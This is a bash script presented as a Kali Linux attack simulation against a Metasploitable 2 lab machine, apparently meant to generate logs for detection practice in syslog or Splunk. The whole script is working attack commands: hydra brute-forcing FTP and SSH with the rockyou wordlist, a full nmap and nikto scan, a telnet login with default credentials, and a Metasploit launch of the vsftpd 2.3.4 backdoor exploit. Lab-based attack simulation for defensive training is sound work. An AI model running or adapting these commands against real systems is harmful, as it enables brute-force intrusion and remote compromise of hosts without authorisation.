#!/bin/bash
# Kali Linux attack simulation script targeting Metasploitable 2
# Make sure the target IP is correct

TARGET_IP="192.168.56.105"
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo "[+] Starting attack simulation against $TARGET_IP..."

# 1. FTP Brute Force
if [ -f "$WORDLIST" ]; then
  echo "[+] Running FTP brute force with hydra..."
  hydra -l msfadmin -P "$WORDLIST" -t 4 ftp://$TARGET_IP -o ftp_attack.log -V -f
else
  echo "[-] Wordlist not found at $WORDLIST. Skipping FTP brute force."
fi

# 2. SSH Brute Force
if [ -f "$WORDLIST" ]; then
  echo "[+] Running SSH brute force with hydra..."
  hydra -l msfadmin -P "$WORDLIST" -t 4 ssh://$TARGET_IP -o ssh_attack.log -V -f
else
  echo "[-] Wordlist not found at $WORDLIST. Skipping SSH brute force."
fi

# 3. Nmap Scan
echo "[+] Running Nmap scan..."
nmap -sV -A -p- $TARGET_IP -oN nmap_scan.log

# 4. Nikto Web Scan
echo "[+] Running Nikto scan..."
nikto -h http://$TARGET_IP -o nikto_scan.log

# 5. Telnet Login Attempt
echo "[+] Trying Telnet login..."
echo -e "msfadmin\nmsfadmin" | telnet $TARGET_IP 23

# 6. Optional Exploit with Metasploit (vsftpd backdoor)
echo "[+] Launching Metasploit exploit (vsftpd)..."
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS $TARGET_IP; run; exit"

echo "[+] Attack simulation complete. Logs stored in current directory."

# Tip: tail -f /var/log/syslog or check Splunk dashboard to observe logs.

